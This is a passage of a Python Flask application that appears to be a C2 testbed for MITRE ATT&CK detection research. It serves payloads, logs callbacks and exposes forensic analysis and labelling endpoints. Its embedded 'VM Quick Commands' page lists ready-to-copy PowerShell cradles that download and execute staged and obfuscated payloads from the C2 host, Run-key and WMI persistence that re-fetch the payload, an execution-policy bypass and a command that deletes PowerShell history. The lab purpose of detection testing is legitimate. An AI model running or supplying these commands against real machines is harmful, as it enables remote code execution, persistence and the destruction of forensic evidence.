        return jsonify({"error": "'detected' is required"}), 400

    if event_id:
        key = event_id
    elif timestamp and source_ip:
        key = f"{timestamp}|{source_ip}"
    else:
        return jsonify({"error": "Provide either event_id or (timestamp and source_ip)"}), 400

    labels = load_manual_labels()
    labels[key] = {
        "detected": bool(detected),
        "tool": tool,
        "techniques": techniques,
        "notes": notes,
        "labeled_at": datetime.datetime.now().isoformat(),
    }
    save_manual_labels(labels)
    return jsonify({"status": "saved", "key": key})

@app.route('/get/<filename>')
def get_payload(filename):
    # Security: prevent path traversal
    if '..' in filename or filename.startswith('/'):
        return "Invalid filename", 400

    filepath = PAYLOAD_DIR / filename
    if filepath.exists() and filepath.is_file():
        # Log download
        timestamp = datetime.datetime.now().isoformat()
        print(f"\033[94m[↓] {timestamp} | {request.remote_addr} downloaded {filename}\033[0m")
        download_log = LOG_DIR / "downloads.log"
        with open(download_log, 'a') as f:
            f.write(f"{timestamp} | {request.remote_addr} | {filename}\n")
        return send_file(filepath, as_attachment=True)
    else:
        return f"Payload not found: {filename}", 404

@app.route('/api/flags')
def api_flags():
    flags = []
    labels = load_manual_labels()
    log_file = LOG_DIR / "c2_log.json"
    if log_file.exists():
        with open(log_file, 'r') as f:
            for line in f:
                try:
                    entry = json.loads(line)
                    flags.append(apply_detection_fields(entry, labels))
                except:
                    pass
    return jsonify({
        "flags": flags,
        "summary": summarize_detection(flags),
    })

@app.route('/clear', methods=['POST'])
def clear_logs():
    for directory in [LOG_DIR, FLAGS_DIR]:
        for path in directory.iterdir():
            if path.is_file():
                path.unlink()
    active_sessions.clear()
    return jsonify({"status": "cleared"})

# ------------------------------------------------------------
# Forensic Analysis Endpoints
# ------------------------------------------------------------
@app.route('/forensic/analyze', methods=['POST'])
def forensic_analyze():
    payload = request.get_json(silent=True) or {}
    dump_path = payload.get("dump_path", "")
    target_pid = payload.get("pid")

    if not dump_path or not Path(dump_path).exists():
        return jsonify({"error": "dump_path required and must exist"}), 400

    config = load_forensic_config()
    analyzer = ForensicAnalyzer(dump_path, config)
    analyzer.full_analysis(target_pid)
    report_path = analyzer.save_report()
    return jsonify({
        "status": "ok",
        "report_path": report_path,
        "report": analyzer.report,
    })


@app.route('/forensic/strings', methods=['POST'])
def forensic_strings():
    payload = request.get_json(silent=True) or {}
    dump_path = payload.get("dump_path", "")
    min_length = payload.get("min_length", 8)

    if not dump_path or not Path(dump_path).exists():
        return jsonify({"error": "dump_path required and must exist"}), 400

    strings = extract_strings_from_dump(dump_path, min_length)
    indicators = search_indicators(strings)
    return jsonify({
        "status": "ok",
        "total_strings": len(strings),
        "indicator_hits": indicators,
    })


@app.route('/forensic/yara', methods=['POST'])
def forensic_yara():
    payload = request.get_json(silent=True) or {}
    target_path = payload.get("target_path", "")

    if not target_path or not Path(target_path).exists():
        return jsonify({"error": "target_path required and must exist"}), 400

    rules = load_yara_rules()
    matches = scan_with_yara(target_path, rules)
    return jsonify({
        "status": "ok",
        "matches": matches,
    })


@app.route('/forensic/correlate', methods=['POST'])
def forensic_correlate():
    payload = request.get_json(silent=True) or {}
    events = payload.get("events", [])
    window = payload.get("window_seconds", 300)
    c2_log = payload.get("c2_log_file", str(LOG_DIR / "c2_log.json"))

    result = correlate_with_c2(events, c2_log, window)
    return jsonify({
        "status": "ok",
        "correlation": result,
    })


@app.route('/forensic/triage', methods=['POST'])
def forensic_triage():
    payload = request.get_json(silent=True) or {}
    text = payload.get("text", "")
    artifact_type = payload.get("artifact_type", "memory_string")

    if not text:
        return jsonify({"error": "text required"}), 400

    result = ai_triage_artifact(
        text,
        artifact_type,
        backend_url=DEFAULT_CONFIG.get("ai_backend_url"),
        timeout=DEFAULT_CONFIG.get("ai_backend_timeout_seconds", 8),
    )
    return jsonify({
        "status": "ok",
        "result": result,
    })


@app.route('/forensic/reports')
def forensic_reports():
    output_dir = Path(load_forensic_config().get("output_dir",
                                                  str(BASE_DIR / "forensic_output")))
    reports = []
    if output_dir.exists():
        for f in sorted(output_dir.glob("forensic_report_*.json"), reverse=True):
            try:
                stat = f.stat()
                reports.append({
                    "name": f.name,
                    "path": str(f),
                    "size": stat.st_size,
                    "mtime": datetime.datetime.fromtimestamp(stat.st_mtime).isoformat(),
                })
            except Exception:
                continue
    return jsonify({"reports": reports})


@app.route('/forensic/analyze-async', methods=['POST'])
def forensic_analyze_async():
    payload = request.get_json(silent=True) or {}
    dump_path = payload.get("dump_path", "")
    target_pid = payload.get("pid")

    if not dump_path or not Path(dump_path).exists():
        return jsonify({"error": "dump_path required and must exist"}), 400

    config = load_forensic_config()
    task_id = start_forensic_task(dump_path, target_pid, config)
    return jsonify({
        "status": "ok",
        "task_id": task_id,
        "message": "Analysis started. Poll /forensic/tasks/" + task_id + " for progress.",
    })


@app.route('/forensic/tasks')
def forensic_tasks():
    return jsonify({
        "status": "ok",
        "tasks": list_tasks(),
    })


@app.route('/forensic/tasks/<task_id>')
def forensic_task_detail(task_id):
    task = get_task(task_id)
    if not task:
        return jsonify({"error": "Task not found"}), 404
    return jsonify({
        "status": "ok",
        "task": task,
    })


@app.route('/forensic/label', methods=['POST'])
def forensic_label():
    payload = request.get_json(silent=True) or {}
    report_name = payload.get("report_name", "")
    finding_index = payload.get("finding_index")
    detected = payload.get("detected")
    notes = payload.get("notes", "")
    analyst = payload.get("analyst", "analyst")

    if not report_name or finding_index is None or detected is None:
        return jsonify({"error": "report_name, finding_index, and detected are required"}), 400

    labels = load_forensic_labels()
    key = f"{report_name}|{finding_index}"
    labels[key] = {
        "report_name": report_name,
        "finding_index": finding_index,
        "detected": bool(detected),
        "notes": notes,
        "analyst": analyst,
        "labeled_at": datetime.datetime.now().isoformat(),
    }
    save_forensic_labels(labels)
    return jsonify({"status": "saved", "key": key})


@app.route('/forensic/report/<report_name>')
def forensic_report_detail(report_name):
    output_dir = Path(load_forensic_config().get("output_dir",
                                                  str(BASE_DIR / "forensic_output")))
    report_path = output_dir / report_name
    if not report_path.exists():
        return jsonify({"error": "Report not found"}), 404

    try:
        with open(report_path, 'r') as f:
            report = json.load(f)
    except Exception:
        return jsonify({"error": "Could not read report"}), 500

    labels = load_forensic_labels()
    findings = report.get("findings", [])
    for idx, finding in enumerate(findings):
        key = f"{report_name}|{idx}"
        label = labels.get(key, {})
        finding["manual_detected"] = label.get("detected")
        finding["manual_notes"] = label.get("notes", "")
        finding["manual_analyst"] = label.get("analyst", "")
        finding["manual_source"] = "analyst" if label else "fallback-regex"

    return jsonify({
        "status": "ok",
        "report": report,
    })


# ------------------------------------------------------------

VM_COMMANDS_HTML = r"""
<!DOCTYPE html>
<html>
<head>
    <title>VM Quick Commands &mdash; C2 Testbed</title>
    <style>
        body { font-family: monospace; margin: 20px; background: #1e1e1e; color: #d4d4d4; }
        h1 { color: #4ec9b0; }
        h2 { color: #ce9178; margin-top: 30px; }
        .container { max-width: 1200px; margin: auto; }
        .cmd-card { border: 1px solid #3e3e3e; padding: 16px; margin-top: 16px; background: #252525; border-radius: 4px; }
        .cmd-label { color: #9cdcfe; font-weight: bold; margin-bottom: 8px; display: block; }
        pre { background: #1d1d1d; color: #d4d4d4; padding: 12px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; border: 1px solid #4a4a4a; }
        .copy-btn { background: #007f6b; color: #fff; border: 0; padding: 6px 12px; cursor: pointer; margin-top: 8px; }
        .copy-btn:hover { background: #005f4f; }
        .note { color: #6a9955; font-size: 13px; margin-top: 8px; }
        .warn { color: #ce9178; font-size: 13px; margin-top: 8px; }
        a { color: #4ec9b0; }
    </style>
</head>
<body>
<div class="container">
    <h1>&#x1F5A5; VM Quick Commands</h1>
    <p>Copy-paste ready PowerShell commands for the Windows VM (target IP: <strong>{{ host_ip }}</strong>). <a href="/dashboard">&larr; Back to Dashboard</a></p>

    <h2>&#x26A1; Prerequisites (run once in PowerShell as Admin)</h2>
    <div class="cmd-card">
        <span class="cmd-label">1. Set Execution Policy (allows scripts to run)</span>
        <pre id="cmd-ep">Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-ep')">Copy</button>
        <div class="note">This only affects the current PowerShell window. For persistent bypass use -Scope LocalMachine.</div>
    </div>

    <div class="cmd-card">
        <span class="cmd-label">2. Quick test &mdash; reach C2 server</span>
        <pre id="cmd-test">Test-NetConnection -ComputerName {{ host_ip }} -Port {{ port }}</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-test')">Copy</button>
    </div>

    <h2>&#x1F4E5; Stage 1 &mdash; Full Scenario Payload</h2>
    <div class="cmd-card">
        <span class="cmd-label">Download &amp; execute stage1 (all 4 techniques)</span>
        <pre id="cmd-stage1">powershell -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('http://{{ host_ip }}:{{ port }}/get/stage1_windows.ps1'))&quot;</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-stage1')">Copy</button>
        <div class="note">Sends: T1059.001 (execution), T1083 (discovery), T1105 (ingress), T1041 (exfiltration)</div>
    </div>

    <h2>&#x1F4E5; Stage 2 &mdash; Staged Downloader</h2>
    <div class="cmd-card">
        <span class="cmd-label">Download cradle &rarr; fetches obfuscated stage2</span>
        <pre id="cmd-stage2">powershell -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('http://{{ host_ip }}:{{ port }}/get/stage2_download_cradle.ps1'))&quot;</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-stage2')">Copy</button>
        <div class="note">Downloads stage2 to $env:TEMP, executes it, then deletes the file.</div>
    </div>

    <h2>&#x1F3AD; Obfuscated Payload (T1027)</h2>
    <div class="cmd-card">
        <span class="cmd-label">Base64-encoded URL + flag decoded at runtime</span>
        <pre id="cmd-obf">powershell -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('http://{{ host_ip }}:{{ port }}/get/obfuscated_windows.ps1'))&quot;</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-obf')">Copy</button>
        <div class="note">Contains System.Convert::FromBase64String artifacts for memory analysis.</div>
    </div>

    <h2>&#x1F512; Registry Persistence (T1547.001)</h2>
    <div class="cmd-card">
        <span class="cmd-label">Add Run key &mdash; payload executes on next logon</span>
        <pre id="cmd-reg">$cmd = 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('''http://{{ host_ip }}:{{ port }}/get/stage1_windows.ps1'''))&quot;'
New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinTelemetry' -Value $cmd -PropertyType String -Force</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-reg')">Copy</button>
        <div class="warn">&#x26A0; This creates real persistence. Remove after experiments:</div>
        <pre id="cmd-reg-rm">Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinTelemetry' -Force</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-reg-rm')">Copy Cleanup</button>
    </div>

    <h2>&#x1F512; WMI Persistence (T1546.003)</h2>
    <div class="cmd-card">
        <span class="cmd-label">WMI event subscription &mdash; event-triggered execution</span>
        <pre id="cmd-wmi">$filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\subscription' -Arguments @{Name='UpdateFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime &gt;= 300'}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\subscription' -Arguments @{Name='UpdateConsumer'; CommandLineTemplate='powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;IEX ((New-Object Net.WebClient).DownloadString('''http://{{ host_ip }}:{{ port }}/get/stage1_windows.ps1'''))&quot;'}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\subscription' -Arguments @{Filter=$filter; Consumer=$consumer}</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-wmi')">Copy</button>
        <div class="warn">&#x26A0; Cleanup after experiments:</div>
        <pre id="cmd-wmi-rm">Get-WmiObject -Class __EventFilter -Namespace 'root\subscription' -Filter &quot;Name='UpdateFilter'&quot; | Remove-WmiObject
Get-WmiObject -Class CommandLineEventConsumer -Namespace 'root\subscription' -Filter &quot;Name='UpdateConsumer'&quot; | Remove-WmiObject
Get-WmiObject -Class __FilterToConsumerBinding -Namespace 'root\subscription' | Where-Object { $_.Filter.Name -eq 'UpdateFilter' } | Remove-WmiObject</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-wmi-rm')">Copy Cleanup</button>
    </div>

    <h2>&#x1F9F9; Cleanup / Reset</h2>
    <div class="cmd-card">
        <span class="cmd-label">Clear temp files and PowerShell history</span>
        <pre id="cmd-clean">Remove-Item &quot;$env:TEMP\stage2.ps1&quot; -Force -ErrorAction SilentlyContinue
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue</pre>
        <button class="copy-btn" onclick="copyToClipboard('cmd-clean')">Copy</button>
    </div>

    <h2>&#x1F517; Useful Links</h2>
    <ul>
        <li><a href="/dashboard">C2 Dashboard</a></li>
        <li><a href="/status">C2 Status</a></li>
        <li><a href="/api/flags">JSON API</a></li>
    </ul>
</div>
<script>
function copyToClipboard(elementId) {
    const text = document.getElementById(elementId).innerText;
    navigator.clipboard.writeText(text).then(() => {
        const btn = document.querySelector('[onclick="copyToClipboard(' + "'" + elementId + "'" + ')"]');
        const oldText = btn.innerText;
        btn.innerText = 'Copied!';
        setTimeout(() => btn.innerText = oldText, 1200);
    });
}
</script>
</body>
</html>
"""


@app.route('/vm-commands')
def vm_commands():
    return render_template_string(VM_COMMANDS_HTML,
                                  host_ip=DEFAULT_CONFIG["host_ip"],
                                  port=DEFAULT_CONFIG["c2_port"])

# Main
# ------------------------------------------------------------
if __name__ == '__main__':
    print(f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║     MITRE ATT&CK C2 Server - Windows Payloads Only       ║
    ╠═══════════════════════════════════════════════════════════╣
    ║  Host IP: {DEFAULT_CONFIG['host_ip']:<44} ║
    ║  Port: {DEFAULT_CONFIG['c2_port']:<44} ║
    ║  Dashboard: http://{DEFAULT_CONFIG['host_ip']}:{DEFAULT_CONFIG['c2_port']}/dashboard ║
    ║  Payload Dir: {str(PAYLOAD_DIR):<44} ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=DEFAULT_CONFIG['c2_port'], debug=False, threaded=True)



